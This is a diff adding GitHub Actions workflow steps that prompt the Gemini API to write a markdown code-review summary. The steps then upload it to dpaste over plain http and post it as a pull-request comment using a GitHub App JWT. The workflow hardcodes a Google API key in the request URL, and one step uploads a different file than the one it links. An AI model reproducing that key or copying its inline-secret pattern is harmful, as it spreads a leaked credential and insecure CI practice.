+        run: cp /home/runner/work/UmV2aWV3/UmV2aWV3/raw_final.txt /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown_detailed.txt && echo -e "I have given you the text above which are the results from many analyzers and some important. So you have to make a detailed report in markdown which encapsulates the above report. DONT use any sort of emoji's. STRICTLY be in the following format:\n\n## Automated Review Comments\nBelow are the review comments:\n\n## Review from Static Analyzer (NAME OF STATIC ANALYZER TOOL (e.g., Eslint)):\n  - Total issues reported： \n    - HIGH \n    - MEDIUM\n    - LOW\n  - (A detailed review of those issues. DONT stretch each issue too long, try to keep a max of 30 words per issue. USE bullet points for the issues)\n\n## Review from Dependency Analyzer [deps.dev]:\n  - Total issues reported： \n    - HIGH \n    - MEDIUM\n    - LOW\n  - (GENERAL REVIEW FROM THE Dependency ANALYZER)\n\n## Review from LLM Analyzer (Gemini flash 2.0):\n  - Total issues reported： \n    - HIGH \n    - MEDIUM\n    - LOW\n  - [GENERAL REVIEW FROM THE LLM ANALYZER]\n\n## Review from Keploy Test Cases:\n  - Total issues reported： \n    - HIGH \n    - MEDIUM\n    - LOW\n  - [GENERAL REVIEW FROM THE KEPLOY TEST CASE ANALYSIS]" >> /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown_detailed.txt
+
+      - name: Generate detailed markdown
+        run: |
+          RESPONSE1=$(curl -s "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=AIzaSyAfGwfrEkj8fXjALdqF2Ih2Xik11gbSFc0" \
+          -H "Content-Type:application/json" \
+          -X POST \
+          -d "$(jq -n --arg txt "$(cat /home/runner/work/UmV2aWV3/UmV2aWV3/prompt_markdown_detailed.txt)" '{"contents":[{"parts":[{"text":$txt}]}]}')")
+
+          echo "$RESPONSE1" | jq -r '.candidates[0].content.parts[0].text' > /home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_detailed.md
+
+      - name: dpaste markdown
+        run: curl -s -F "syntax=md" -F "content=</home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_small.md" http://dpaste.com/api/v2/ > /home/runner/work/UmV2aWV3/UmV2aWV3/markdownurl.txt
+
+      - name: Append dpaste link to small summary
+        run: echo -e "\n\nYou can checkout the detailed review here [Markdown]($(cat /home/runner/work/UmV2aWV3/UmV2aWV3/markdownurl.txt)-preview)" >> /home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_detailed.md
+
+      - name: Send comment as bot
+        run: |
+          pr_url="${{ github.event.client_payload.pr_url }}"
+          echo "PR URL: $pr_url"
+
+          pr_path="${pr_url#*github.com/}"
+          owner_repo="${pr_path%%/pull*}"
+          owner="${owner_repo%/*}"
+          repo="${owner_repo#*/}"
+
+          pr_number="${{ github.event.client_payload.pr_number }}"
+          if [ -z "$pr_number" ]; then
+            pr_number="${pr_url##*/pull/}"
+          fi
+
+          APP_ID="${{ secrets.BOT_APP_ID }}"
+          PRIVATE_KEY="${{ secrets.BOT_PRIVATE_KEY }}"
+          echo "$PRIVATE_KEY" > private-key.pem
+
+          NOW=$(date +%s)
+          EXPIRATION=$((NOW + 600))
+          HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
+          PAYLOAD=$(echo -n '{"iat":'"$NOW"',"exp":'"$EXPIRATION"',"iss":'"$APP_ID"'}' | base64 | tr -d '=' | tr '/+' '_-')
+          SIGNATURE=$(echo -n "$HEADER.$PAYLOAD" | openssl dgst -sha256 -sign private-key.pem | base64 | tr -d '=' | tr '/+' '_-')
+          JWT="$HEADER.$PAYLOAD.$SIGNATURE"
+          JWT=$(echo "$JWT" | tr -d '\n' | tr -d ' ')
+
+          INSTALL_TOKEN=$(curl -s -X POST \
+            -H "Authorization: Bearer $JWT" \
+            -H "Accept: application/vnd.github.v3+json" \
+            "https://api.github.com/app/installations/${{ secrets.BOT_INSTALLATION_ID }}/access_tokens" \
+            | jq -r '.token')
+
+          rm private-key.pem
+
+          COMMENT_BODY=$(< /home/runner/work/UmV2aWV3/UmV2aWV3/summary_markdown_detailed.md)
+          ESCAPED_COMMENT_BODY=$(echo "$COMMENT_BODY" | jq -Rs .)
+
+          curl -X POST \
+            -H "Authorization: Bearer $INSTALL_TOKEN" \
+            -H "Accept: application/vnd.github.v3+json" \
+            -H "Content-Type: application/json" \
+            -d '{"body": '"$ESCAPED_COMMENT_BODY"'}' \
+            "https://api.github.com/repos/$owner/$repo/issues/$pr_number/comments"
